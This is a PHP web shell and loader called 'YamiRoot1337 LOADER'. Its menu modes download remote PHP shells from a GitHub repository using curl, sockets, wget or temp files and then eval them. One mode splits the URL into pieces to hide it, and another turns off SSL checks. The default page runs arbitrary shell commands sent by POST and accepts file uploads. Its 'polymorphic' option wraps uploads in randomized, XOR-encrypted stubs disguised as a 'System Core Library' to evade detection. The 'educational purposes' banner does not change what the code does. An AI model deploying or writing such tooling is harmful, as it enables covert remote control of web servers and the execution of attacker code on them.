<?php
session_start();
@ini_set('display_errors', 0);
@set_time_limit(0);
@error_reporting(0);
@ini_set('memory_limit', '256M');

if (isset($_GET['m'])) {
    $_SESSION['loader_m'] = $_GET['m'];
}
$m = $_SESSION['loader_m'] ?? 'h';

if ($m === 'h') {
    session_unset();
}

switch($m){
    case "curl":
        $url = 'https://raw.githubusercontent.com/6ickzone/0x6NyxWebShell/refs/heads/main/YamiRoot_Series/YR_VoidGateDX.php';
        $code = @file_get_contents($url);
        if ($code === false || empty($code)) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
            curl_setopt($ch, CURLOPT_TIMEOUT, 20);
            curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; PHP Script)');
            $code = curl_exec($ch);
            curl_close($ch);
        }
        if ($code) eval("?>$code");
        break;

    case "curlman":
        function load_content(){
            $part1 = 'ht' . 'tps://' . 'raw.' . 'github' . 'usercontent' . '.com/';
            $part2 = '6ickzone' . '/0x6NyxWebShell/';
            $part3 = 'refs/' . 'heads/' . 'main/';
            $part4 = 'yami.php';
            $target_url = $part1.$part2.$part3.$part4;
            $data = '';
            if(function_exists('curl_init')){
                $ch = curl_init($target_url);
                curl_setopt_array($ch, [
                    CURLOPT_RETURNTRANSFER => 1,
                    CURLOPT_FOLLOWLOCATION => true,
                    CURLOPT_CONNECTTIMEOUT => 5,
                    CURLOPT_TIMEOUT => 10,
                    CURLOPT_SSL_VERIFYPEER => 0,
                    CURLOPT_SSL_VERIFYHOST => 0,
                    CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; StealthLoader/1.0)'
                ]);
                $data = curl_exec($ch);
                curl_close($ch);
            }
            if(empty($data)) $data = @file_get_contents($target_url);
            if($data) eval("?>$data");
        }
        load_content();
        break;

    case "tmp":
        $payload_url = 'https://raw.githubusercontent.com/6ickzone/0x6ickShell-Manager/refs/heads/main/bypass.php';
        $tmp_path = '/tmp/.sess_' . substr(md5($_SERVER['HTTP_HOST']), 0, 10) . '.php';
        if (isset($_GET['reload']) || !file_exists($tmp_path) || filesize($tmp_path) == 0) {
            $payload = file_get_contents($payload_url);
            if (stripos($payload, '<?php') !== false) {
                file_put_contents($tmp_path, $payload);
                usleep(300000);
            }
        }
        if (file_exists($tmp_path) && filesize($tmp_path) > 0) include_once($tmp_path);
        break;

    case "cache":
        $tmp = 'cache_ym.php';
        $url = 'https://raw.githubusercontent.com/6ickzone/0x6NyxWebShell/refs/heads/main/yami.php';
        if (!file_exists($tmp) || filesize($tmp) < 10) {
            $code = file_get_contents($url);
            file_put_contents($tmp, $code);
        }
        include($tmp);
        unlink($tmp);
        break;

    case "curlv2":
        $Url = 'https://raw.githubusercontent.com/6ickzone/0x6NyxWebShell/refs/heads/main/void.php';
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $Url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $output = curl_exec($ch);
        curl_close($ch);
        if ($output) {
            eval('?>'.$output);
        }
        break;

    case "wget":
        $url = 'https://raw.githubusercontent.com/6ickzone/0x6NyxWebShell/refs/heads/main/random/simple.php';
        $tmp_file = '/tmp/sess_'.md5($url).'.php';
        if(is_executable('/usr/bin/wget')) {
            $command = "/usr/bin/wget -q -O $tmp_file $url";
        } else {
            $command = "/usr/bin/curl -s -o $tmp_file $url";
        }
        @shell_exec($command);
        if (file_exists($tmp_file) && filesize($tmp_file) > 0) {
            include($tmp_file);
            unlink($tmp_file);
        } else {
            echo "Error: Failed to download file or shell_exec is disabled.";
        }
        break;

    case "socket":
        $host = 'raw.githubusercontent.com';
        $path = '/6ickzone/0x6NyxWebShell/refs/heads/main/yami.php';
        $port = 443;
        $fp = @fsockopen("ssl://" . $host, $port, $errno, $errstr, 10);
        if ($fp) {
            $out = "GET $path HTTP/1.1\r\n";
            $out .= "Host: $host\r\n";
            $out .= "Connection: Close\r\n\r\n";
            fwrite($fp, $out);
            $response = '';
            while (!feof($fp)) {
                $response .= fgets($fp, 128);
            }
            fclose($fp);
            $body = substr($response, strpos($response, "\r\n\r\n") + 4);
            if (!empty($body)) {
                eval("?>$body");
            } else {
                echo "Error: Failed to get content via socket.";
            }
        } else {
            echo "Error: Could not open socket to $host ($errstr)";
        }
        break;

    case "telegram":
        echo '<div style="font-family: monospace; text-align: center; margin-top: 50px; color: #00ff88;">';
        echo '<h2 style="color: #ff6b6b;">⚠️ WARNING!</h2>';
        echo '<p style="color: #888;">This tool is for educational purposes only.</p><br>';
        echo '<p style="color: #00d4ff;">Contact Author:</p>';
        echo '<a href="https://t.me/Yungx6ick" target="_blank" style="color: #00ff88; font-size: 20px; text-decoration: none; border: 1px solid #00ff88; padding: 10px 30px; border-radius: 6px;">6ickzone</a>';
        echo '<br><br><a href="?m=h" style="color: #888; text-decoration: none;">← Back to Menu</a>';
        echo '</div>';
        break;

    default:
        function randStr($length = 10) {
            $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
            $res = '';
            for ($i = 0; $i < $length; $i++) {
                $res .= $chars[rand(0, strlen($chars) - 1)];
            }
            return $res;
        }

        function process_upload($file, $secure) { 
            $filename = basename($file['name']); 
            $dirname = dirname(__FILE__); 
            $result = []; 
            
            if (!$secure) { 
                $targetPath = $dirname . '/' . $filename; 
                if (@move_uploaded_file($file['tmp_name'], $targetPath)) { 
                    $result['status'] = 'success'; 
                    $result['message'] = "Normal Upload Success!"; 
                    $result['path'] = $targetPath; 
                } else { 
                    $result['status'] = 'failed'; 
                    $result['message'] = "Upload Failed!"; 
                } 
            } else { 
                $raw_code = @file_get_contents($file['tmp_name']); 
                if ($raw_code !== FALSE) { 
                    $raw_code = preg_replace('/^<\?php/', '', $raw_code);
                    $raw_code = preg_replace('/\?>$/', '', $raw_code);
                    $raw_code = trim($raw_code);

                    // Encryption Logic (Exact from KCK Original)
                    $key_part = 'JNdtOotLGjdSlFDgVnDDuXBmyQTId'; 
                    
                    $step1 = gzcompress($raw_code, 9);
                    $step2 = "";
                    $k_len = strlen($key_part);
                    for ($i = 0; $i < strlen($step1); $i++) {
                        $step2 .= $step1[$i] ^ $key_part[$i % $k_len];
                    }
                    $step3 = bin2hex($step2);
                    $step4 = strrev($step3);
                    $final_payload = base64_encode($step4);

                    // Randomize Signatures (Polymorphism)
                    $cls_name   = "Core_".randStr(5)."_Mod";
                    $func_exec  = randStr(8);
                    $func_entry = "init_".randStr(4);
                    
                    // Key & Integrity functions
                    $f_k1 = randStr(6); $f_k2 = randStr(6); $f_k3 = randStr(6);
                    $f_i1 = randStr(6); $f_i2 = randStr(6); $f_i3 = randStr(6);

                    // Internal Variables
                    $v_payload  = randStr(5);
                    $v_decoded  = randStr(5);
                    $v_key      = randStr(5);
                    $v_integ    = randStr(5);
                    $v_final    = randStr(5);
                    
                    // Decoys
                    $c_decoy1   = "CONF_".strtoupper(randStr(6));

                    // --- STUB GENERATION (Exact Original Structure) ---
                    $stub = '<?php
/**
 * System Core Library
 * ID: '.uniqid().'
 * Status: Validated
 * Author: 0x6ick - 6ickzone
 */
error_reporting(0);
ini_set("memory_limit", "512M");

define(\''.$c_decoy1.'\', \''.randStr(15).'\');

class '.$cls_name.' {
    
    // Key Storage
    private function '.$f_k1.'() { return \'JNdtOotLGj\'; }
    private function '.$f_k2.'() { return \'dSlFDgVnD\'; }
    private function '.$f_k3.'() { return \'DuXBmyQTId\'; }

    // Integrity Hash
    private function '.$f_i1.'() { return \'rpPjMuDSyooNdnfJxqJS\'; }
    private function '.$f_i2.'() { return \'aWZeByWUgPivEUyaJKLd\'; }
    private function '.$f_i3.'() { return \'UMruuemTGosDnBBnAslX\'; }

    // Executor
    private function '.$func_exec.'($c = \'\') {
        if (empty($c)) return null;
        $c = preg_replace(\'/[\x00-\x08\x0B-\x0C\x0E-\x1F\x7F]/\', \'\', $c);
        try {
            return eval(trim($c));
        } catch (Throwable $e) { return null; }
    }

    public static function '.$func_entry.'() {
        // Encrypted Payload
        $'.$v_payload.' = \'' . $final_payload . '\';
        
        // 1. Decode Chain
        $'.$v_decoded.' = hex2bin(strrev(base64_decode($'.$v_payload.')));
        
        // 2. Reconstruct Key
        $o = new self();
        $'.$v_key.' = $o->'.$f_k1.'() . $o->'.$f_k2.'() . $o->'.$f_k3.'();
        
        // 3. Integrity Check
        $'.$v_integ.' = $o->'.$f_i1.'() . $o->'.$f_i2.'() . $o->'.$f_i3.'();
        if (md5($'.$v_integ.') !== \'9bdbd9958a3da2272fc03d5cd89df03b\') { return; }

        // 4. Decrypt XOR
        $'.$v_final.' = \'\';
        $kl = strlen($'.$v_key.');
        for ($i=0, $len = strlen($'.$v_decoded.'); $i < $len; $i++) {
            $'.$v_final.' .= chr(ord($'.$v_decoded.'[$i]) ^ ord($'.$v_key.'[$i % $kl]));
        }
        
        // 5. Decompress
        $res = @gzuncompress($'.$v_final.');
        if ($res === false) { $res = @gzinflate($'.$v_final.'); }
        
        // 6. Execution via Reflection
        if ($res) {
            $ref = new ReflectionMethod(__CLASS__, \''.$func_exec.'\');
            $ref->setAccessible(true);
            $ref->invoke(new self(), $res);
        }
    }
}

// Auto Init
if (!defined(\'_SYS_LOADED\')) {
    define(\'_SYS_LOADED\', true);
    '.$cls_name.'::'.$func_entry.'();
}
?>';

                    $encodedFilename = pathinfo($filename, PATHINFO_FILENAME) . '_kck.php'; 
                    $encodedPath = $dirname . '/' . $encodedFilename; 

                    if (@file_put_contents($encodedPath, $stub) !== false) { 
                        $result['status'] = 'success'; 
                        $result['message'] = "KCK Secure Upload Success!"; 
                        $result['path'] = $encodedPath; 
                    } else { 
                        $result['status'] = 'failed'; 
                        $result['message'] = "KCK Secure Upload Failed!"; 
                    } 
                } else { 
                    $result['status'] = 'failed'; 
                    $result['message'] = "Failed to read file content!"; 
                } 
            } 
            return $result; 
        } 

        if (isset($_FILES['uploaded_files'])) { 
            $secure = isset($_POST['secure_upload']) && $_POST['secure_upload'] === 'true'; 
            $upload_results = []; 
            $file_count = count($_FILES['uploaded_files']['name']); 
            for ($i = 0; $i < $file_count; $i++) { 
                $file_to_process = [ 
                    'name' => $_FILES['uploaded_files']['name'][$i], 
                    'tmp_name' => $_FILES['uploaded_files']['tmp_name'][$i], 
                ]; 
                $upload_results[] = process_upload($file_to_process, $secure); 
            } 
        } 

        $output = ''; 
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) { 
            $cmd = $_POST['cmd']; 
            $output = @shell_exec($cmd . ' 2>&1'); 
        }
        ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>YamiRoot1337 | LOADER</title>
            <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
            <style>
                :root { 
                    --bg-main: #F5F5F5; 
                    --fg-main: #333333; 
                    --bg-box: #FFFFFF; 
                    --border-main: #CCCCCC; 
                    --accent: #007bff; 
                    --input-bg: #EFEFEF; 
                    --font: 'Share Tech Mono', monospace; 
                }
                body { 
                    background-color: var(--bg-main); 
                    color: var(--fg-main); 
                    font-family: var(--font); 
                    padding: 40px; 
                    line-height: 1.6;
                }
                h1 { 
                    text-align: center; 
                    font-size: 2.2rem; 
                    margin-bottom: 25px; 
                    color: var(--accent); 
                    font-weight: 600;
                }
                .loader-menu-container {
                    max-width: 700px;
                    margin: 0 auto 30px auto;
                    background: var(--bg-box);
                    padding: 20px;
                    border: 1px solid var(--border-main);
                    border-radius: 8px;
                    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
                    text-align: center;
                }
                .loader-menu-title {
                    font-size: 0.95rem;
                    color: var(--accent);
                    margin-bottom: 12px;
                    font-weight: bold;
                    text-transform: uppercase;
                    letter-spacing: 1px;
                }
                .loader-row {
                    display: flex;
                    justify-content: center;
                    gap: 8px;
                    margin-bottom: 8px;
                    flex-wrap: wrap;
                }
                .loader-btn {
                    display: inline-block;
                    padding: 6px 14px;
                    background: var(--input-bg);
                    color: var(--fg-main);
                    border: 1px solid var(--border-main);
                    border-radius: 4px;
                    text-decoration: none;
                    font-size: 0.9rem;
                    font-family: var(--font);
                    transition: all 0.2s;
                }
                .loader-btn:hover {
                    background: var(--accent);
                    color: #FFFFFF;
                    border-color: var(--accent);
                }
                .loader-btn.contact {
                    border-color: #ff6b6b;
                    color: #ff6b6b;
                }
                .loader-btn.contact:hover {
                    background: #ff6b6b;
                    color: #FFFFFF;
                }
                h2 { color: var(--accent); font-size: 1.2rem; margin-bottom: 10px;} 
                form, .box, .uploader { 
                    max-width: 700px; 
                    margin: 20px auto; 
                    background: var(--bg-box); 
                    padding: 30px; 
                    border: 1px solid var(--border-main); 
                    border-radius: 8px; 
                    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
                } 
                .box strong { color: var(--accent); } 
                .box a { color: var(--accent); text-decoration: none; word-break: break-all; } 
                input[type="text"], button, .file-label { 
                    width: 100%; 
                    padding: 12px 15px; 
                    margin-top: 10px; 
                    background: var(--input-bg); 
                    color: var(--fg-main); 
                    border: 1px solid var(--border-main); 
                    border-radius: 4px; 
                    font-size: 16px; 
                    box-sizing: border-box; 
                    transition: all 0.2s; 
                    font-family: var(--font);
                } 
                input[type="text"]:focus { 
                    border-color: var(--accent); 
                    box-shadow: 0 0 5px rgba(0, 123, 255, 0.5); 
                    outline: none; 
                    background: #fff;
                } 
                button[type="submit"] { 
                    background: var(--accent); 
                    color: #FFFFFF; 
                    border: 1px solid var(--accent); 
                    font-weight: bold;
                } 
                button[type="submit"]:hover { 
                    background: #0056b3; 
                    color: #FFFFFF; 
                    cursor: pointer; 
                    border-color: #0056b3;
                } 
                label { 
                    font-weight: bold; 
                    display: block; 
                    margin-top: 15px; 
                    color: var(--fg-main);
                } 
                pre { 
                    background-color: #222222; 
                    padding: 15px; 
                    border-radius: 5px; 
                    color: #FFFFFF; 
                    overflow-x: auto; 
                    white-space: pre-wrap; 
                    word-wrap: break-word; 
                    border: 1px solid #444; 
                    margin-top: 15px; 
                    font-size: 0.95em;
                } 
                .uploader { 
                    text-align: center; 
                    cursor: pointer; 
                    position: relative; 
                    border: 2px dashed var(--border-main); 
                    padding: 50px 30px;
                } 
                .uploader:hover { 
                    border-color: var(--accent); 
                    background-color: #F8F8FF;
                } 
                .uploader.dragover { 
                    background-color: #E6F0FF; 
                    border-color: var(--accent);
                } 
                .uploader p { 
                    margin: 0; 
                    font-size: 18px; 
                    color: var(--fg-main);
                } 
                label.file-label { 
                    width: auto; 
                    background: var(--accent); 
                    color: #FFFFFF; 
                    border: 1px solid var(--accent); 
                    font-weight: normal; 
                    margin-top: 20px; 
                    cursor: pointer;
                } 
                label.file-label:hover { 
                    background: #0056b3; 
                } 
                #secureUploadCheckbox { 
                    width: auto; 
                    margin-right: 10px; 
                } 
                .uploader label { 
                    text-align: left; 
                    font-weight: normal; 
                    margin-top: 10px; 
                    display: flex; 
                    align-items: center;
                } 
                #fileInput { display: none; } 
                .site-footer { 
                    max-width: 700px; 
                    margin: 40px auto 0; 
                    padding-top: 20px; 
                    border-top: 1px solid var(--border-main); 
                    text-align: center; 
                    font-size: 0.9em; 
                    color: #999;
                } 
                .site-footer a { color: var(--accent); text-decoration: none;} 
                .quick-actions { 
                    max-width: 700px; 
                    margin: 10px auto 20px; 
                    text-align: center; 
                    padding: 10px 0;
                } 
                .action-btn { 
                    width: auto; 
                    display: inline-block; 
                    padding: 8px 15px; 
                    margin: 0 5px; 
                    background: var(--input-bg); 
                    color: var(--fg-main); 
                    border: 1px solid var(--border-main); 
                    border-radius: 4px; 
                    cursor: pointer; 
                    transition: all 0.2s; 
                    font-size: 0.9em;
                } 
                .action-btn:hover { 
                    background: var(--accent); 
                    color: #FFFFFF; 
                    border-color: var(--accent); 
                    box-shadow: 0 2px 5px rgba(0, 123, 255, 0.3);
                } 
                #uploadProgressContainer { 
                    margin-top: 20px; 
                    border-top: 1px solid var(--border-main); 
                    padding-top: 15px; 
                    text-align: left; 
                    display: none;
                } 
                #fileList { 
                    list-style: none; 
                    padding: 0; 
                    margin-bottom: 15px; 
                    font-size: 0.9em;
                } 
                #fileList li { 
                    background: var(--input-bg); 
                    padding: 8px 12px; 
                    margin-bottom: 5px; 
                    border-radius: 4px; 
                    display: flex; 
                    justify-content: space-between; 
                    align-items: center;
                } 
                .progress-bar { 
                    height: 10px; 
                    background: #ddd; 
                    border-radius: 5px; 
                    overflow: hidden; 
                    width: 100%; 
                    margin-top: 5px;
                } 
                .progress-bar-fill { 
                    height: 100%; 
                    width: 0; 
                    background-color: var(--accent); 
                    transition: width 0.3s ease;
                } 
            </style>
        </head>
        <body>
            <h1>ヤミRoot | LOADER</h1>

            <!-- Loader Menu Navigation -->
            <div class="loader-menu-container">
                <div class="loader-menu-title">Select loader via ?m=</div>
                <div class="loader-row">
                    <a href="?m=curl" class="loader-btn">[curl]</a>
                    <a href="?m=curlman" class="loader-btn">[curlman]</a>
                    <a href="?m=tmp" class="loader-btn">[tmp]</a>
                    <a href="?m=cache" class="loader-btn">[cache]</a>
                </div>
                <div class="loader-row">
                    <a href="?m=curlv2" class="loader-btn">[curlv2]</a>
                    <a href="?m=wget" class="loader-btn">[wget]</a>
                    <a href="?m=socket" class="loader-btn">[socket]</a>
                </div>
                <div class="loader-row" style="margin-top: 12px; border-top: 1px dashed var(--border-main); padding-top: 10px;">
                    <a href="?m=telegram" class="loader-btn contact">--[Author / Contact]--</a>
                </div>
            </div>

            <div class="quick-actions"> 
                <button type="button" class="action-btn" data-cmd="whoami">Whoami</button> 
                <button type="button" class="action-btn" data-cmd="uname -a">Uname -a</button> 
                <button type="button" class="action-btn" data-cmd="ls -la">LS -la</button> 
            </div> 

            <form method="POST" id="cmdForm" autocomplete="off"> 
                <label for="cmd">Enter Command</label> 
                <input type="text" name="cmd" id="cmd" placeholder="whoami" /> 
                <button type="submit">Run Command</button> 
            </form> 

            <?php 
            if (!empty($output)) { 
                echo '<div class="box">'; 
                echo "<h2>Output:</h2><pre>" . htmlspecialchars($output) . "</pre>"; 
                echo '</div>'; 
            } 

            if (isset($upload_results) && is_array($upload_results)) { 
                echo '<div class="box">'; 
                echo "<h2>Upload Results:</h2>"; 
                $success_count = 0; 
                foreach ($upload_results as $res) { 
                    if ($res['status'] == 'success') { 
                        $success_count++; 
                        $fullUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . rtrim(dirname($_SERVER['PHP_SELF']), '/\\') . '/' . basename($res['path']); 
                        echo "<div style='margin-bottom: 15px;'><strong>√ {$res['message']}</strong><br>"; 
                        echo "<span style='color: var(--fg-main);'>🗁</span> Saved to: <pre style='margin: 5px 0 0;'>{$res['path']}</pre>"; 
                        echo "<span style='color: var(--fg-main);'>→</span> Access URL: <a href='$fullUrl' target='_blank'>$fullUrl</a>"; 
                        if ($secure) { 
                            echo "<br><span style='color: var(--fg-main);'>✓</span> KCK Polymorphic Encrypted"; 
                        } 
                        echo "</div>"; 
                    } else { 
                        echo "<div style='color:#ff4444; margin-bottom: 15px;'><strong>X Upload Failed!</strong>: {$res['message']}</div>"; 
                    } 
                } 
                echo "<p style='border-top: 1px dashed var(--border-main); padding-top: 10px; font-size: 0.9em;'>Total: {$success_count}/" . count($upload_results) . " files processed.</p>"; 
                echo '</div>'; 
            } 
            ?> 

            <div class="uploader" id="uploader"> 
                <p>Drag & Drop files here or click the button below to select files</p> 
                <form id="uploadForm" method="POST" enctype="multipart/form-data"> 
                    <label for="fileInput" class="file-label">Select Files</label> 
                    <input type="file" id="fileInput" name="uploaded_files[]" multiple /> 
                    <label> 
                        <input type="checkbox" id="secureUploadCheckbox" name="secure_upload" value="true" /> Secure Upload (KCK Polymorphic Encrypt) 
                    </label> 
                    <div id="uploadProgressContainer"> 
                        <p>File List (<span id="fileCount">0</span>):</p> 
                        <ul id="fileList"> 
                        </ul> 
                        <p>Total Progress:</p> 
                        <div class="progress-bar"> 
                            <div class="progress-bar-fill" id="totalProgressBar"></div> 
                        </div> 
                    </div> 
                    <button type="submit" style="margin-top:10px;">Upload Files</button> 
                </form> 
            </div> 

            <footer class="site-footer"> 
                <p>Powered by <a href="https://6ickzone.site" target="_blank" rel="noopener noreferrer">6ickzone</a> ヤミRoot</p> 
            </footer> 

            <script> 
                const uploader = document.getElementById('uploader'); 
                const fileInput = document.getElementById('fileInput'); 
                const uploadForm = document.getElementById('uploadForm'); 
                const cmdInput = document.getElementById('cmd'); 
                const actionButtons = document.querySelectorAll('.action-btn'); 
                const fileList = document.getElementById('fileList'); 
                const fileCountSpan = document.getElementById('fileCount'); 
                const progressContainer = document.getElementById('uploadProgressContainer'); 
                const totalProgressBar = document.getElementById('totalProgressBar'); 

                actionButtons.forEach(button => { 
                    button.addEventListener('click', () => { 
                        const command = button.getAttribute('data-cmd'); 
                        cmdInput.value = command; 
                        cmdInput.focus(); 
                    }); 
                }); 

                fileInput.addEventListener('change', updateFileList); 
                uploader.addEventListener('dragover', (e) => { 
                    e.preventDefault(); 
                    uploader.classList.add('dragover'); 
                }); 
                uploader.addEventListener('dragleave', () => { 
                    uploader.classList.remove('dragover'); 
                }); 
                uploader.addEventListener('drop', (e) => { 
                    e.preventDefault(); 
                    uploader.classList.remove('dragover'); 
                    if(e.dataTransfer.files.length) { 
                        fileInput.files = e.dataTransfer.files; 
                        updateFileList(); 
                    } 
                }); 

                function updateFileList() { 
                    const files = fileInput.files; 
                    fileList.innerHTML = ''; 
                    fileCountSpan.textContent = files.length; 
                    if (files.length > 0) { 
                        progressContainer.style.display = 'block'; 
                        for (let i = 0; i < files.length; i++) { 
                            const li = document.createElement('li'); 
                            li.innerHTML = ` 
                                <span>${files[i].name} (${(files[i].size / 1024).toFixed(1)} KB)</span> 
                                <span id="status-${i}" style="color: #999;">Ready</span> 
                            `; 
                            fileList.appendChild(li); 
                        } 
                    } else { 
                        progressContainer.style.display = 'none'; 
                    } 
                } 

                uploadForm.addEventListener('submit', (e) => { 
                    const files = fileInput.files; 
                    if (files.length === 0) return; 
                    totalProgressBar.style.width = '0%'; 
                    fileList.querySelectorAll('li').forEach((li, index) => { 
                        const statusSpan = li.querySelector(`#status-${index}`); 
                        statusSpan.style.color = '#999'; 
                        statusSpan.textContent = 'Processing...'; 
                    }); 
                    let uploadedCount = 0; 
                    const intervalTime = 1000 / files.length; 
                    const simulateUpload = setInterval(() => { 
                        if (uploadedCount < files.length) { 
                            const statusSpan = fileList.querySelector(`#status-${uploadedCount}`); 
                            statusSpan.style.color = 'green'; 
                            statusSpan.textContent = 'Done!'; 
                            uploadedCount++; 
                            const percent = (uploadedCount / files.length) * 100; 
                            totalProgressBar.style.width = percent.toFixed(0) + '%'; 
                        } else { 
                            clearInterval(simulateUpload); 
                        } 
                    }, intervalTime); 
                }); 
            </script> 
        </body> 
        </html>
        <?php
        break;
}
?>
